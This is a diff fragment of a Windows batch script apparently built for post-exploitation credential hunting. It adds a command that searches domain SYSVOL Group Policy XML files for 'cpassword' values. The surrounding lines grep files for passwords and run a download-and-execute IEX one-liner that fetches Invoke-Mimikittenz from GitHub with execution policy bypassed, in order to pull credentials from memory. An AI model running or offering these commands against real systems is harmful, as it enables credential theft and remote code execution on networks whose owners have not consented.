@@ -14,6 +14,7 @@ ECHO.
 ECHO [+] Search using Powershell
 ECHO -------------------------------------------------------------------
 cmd.exe /c powershell.exe -ep bypass "findstr /si pass *.doc, *.txt"
+powershell.exe findstr /S /I cpassword \\TEST-LAB\sysvol\TEST-LAB\policies\*.xml
 cmd.exe /c powershell.exe -ep bypass "ls -R -Path %EXFIL%\*.txt | select-string -Pattern password"
 cmd.exe /c powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1'); $m = Invoke-Mimikittenz; $m
 ECHO.
